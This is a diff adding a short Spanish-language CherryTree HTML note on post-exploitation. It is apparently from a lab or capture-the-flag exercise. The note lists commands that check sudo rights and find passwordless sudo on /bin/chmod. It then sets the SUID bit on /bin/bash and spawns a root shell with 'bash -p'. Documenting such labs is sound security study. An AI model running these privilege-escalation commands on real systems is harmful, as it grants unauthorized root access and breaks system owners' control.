@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Post-explotación</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Post-explotación</h1><br/><p>SE VERIFICA QUIENES SOMOS EN EL SISTEMA</p><p></p><p><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">whoami</span></pre></div></p><p></p><p>SE REVISAN PERMISOS DE SUPERUSUARIO PARA ESCALADA DE PRIVILEGIOS</p><p></p><p><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">sudo</span> -l</pre></div></p><p><img src="images/19-1.png" alt="images/19-1.png" /></p><p></p><p>SE OBSERVA QUE EL BINA /bin/chmod POSEE PERMISOS SIN PASSWD</p><p></p><p>SE CREA UN BASH CON SUID</p><p></p><p>PRIMERO SE DAN PERMISOS SUID A LA BASH</p><p></p><p><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">sudo</span> /bin/chmod +s /bin/bash</pre></div></p><p>SEGUNDO SE EJECUTA LA BASH PRESERVANDO EL PERMISO</p><p><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">/</span>bin<span style="color:#bf2e5e;font-weight:400">/</span>bash -p</pre></div></p><p><img src="images/19-2.png" alt="images/19-2.png" /></p><p></p></div>
+</body>
+</html>
